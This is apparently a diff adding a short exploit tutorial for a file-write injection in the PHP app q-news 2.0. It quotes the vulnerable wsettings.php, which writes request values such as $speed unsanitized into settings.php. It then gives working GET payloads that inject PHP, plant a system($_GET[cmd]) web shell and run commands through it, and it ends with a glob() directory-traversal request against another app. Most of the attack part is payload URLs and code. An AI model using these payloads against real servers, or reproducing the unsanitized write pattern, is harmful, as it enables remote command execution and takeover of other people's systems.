@@ -1,0 +1,70 @@
+Exploiting File Write Vulnerabilities:
+-------------------------------------
+q-news 2.0
+http://sourceforge.net/projects/homap
+File: /wsettings.php
+<?php
+$filename = 'settings.php';
+if (is_writable($filename)) {
+	if (!$handle = fopen($filename, 'w')) {
+		print "Cannot open file ($filename)";
+	exit;
+	}
+	if (!fwrite($handle, "<?php
+	\$password = '$password';
+	\$font = '$font';
+	\$height = '$height';
+	\$width = '$width';
+	\$direction = '$direction';
+	\$speed = '$speed';//if the register global is on and the version of PHP is old then it can be overwritting.
+	\$bgcolor = '$bgcolor';
+	\$txtcolor = '$txtcolor';
+	\$txtsize = '$txtsize';
+	?>")) {
+		print "Cannot write to file ($filename)";
+		exit;
+	}
+	print "Successfully saved settings to file ($filename)";
+	fclose($handle);
+} else {
+	print "The file $filename is not writable";
+}
+?>
+<br><br><br><br><br><br><div align='center'>
+
+Vulnerability Explained:
+------------------------
+wsettings.php writes to a file called settings.php PHP code. The user has input to the via the $speed variable, you can easily write PHP 
+Code into the file which can be called via a Web Server GET Request and executed.
+
+URL (GET Request):
+------------------
+http://10.0.0.4/q-news-2.0/wsettings.php?speed=';%20echo%20'This%20file%20is%20vulnerable%20to%20Injection%20[fwrite()]
+
+In the example above we are injecting into user input that is used by fwrite. The output of fwrite() happens to be a PHP Script (<?php ?>) 
+as well so we can insert PHP code in easily, although if this wasn't the case PHP tags could easily be added.
+
+URL (GET Request):
+------------------
+http://10.0.0.4/q-news-2.0/settings.php
+
+We call settings.php and our PHP code is executed, the output of which Is shown above.
+
+What is shown above is use of injection into input sent to fwrite() for Remote Code Execution.
+
+Of course we could also do:
+(fwrite) File Write Injection → Remote Code Execution (via GET Request) → Remote Command Execution
+
+URL (GET Request):
+------------------
+http://10.0.0.4/q-news-2.0/wsettings.php?speed=';%20system($_GET[cmd]);'
+
+URL (GET Request):
+------------------
+http://10.0.0.4/q-news-2.0/settings.php?cmd=driverquery
+
+glob() Injection – Directory Traversal:
+---------------------------------------
+URL (GET Request):
+------------------
+http://10.0.0.4/FileDiskReadWrite/app1/filetemplatelist.php?dir=%5C*%5C*%5C*%5C*
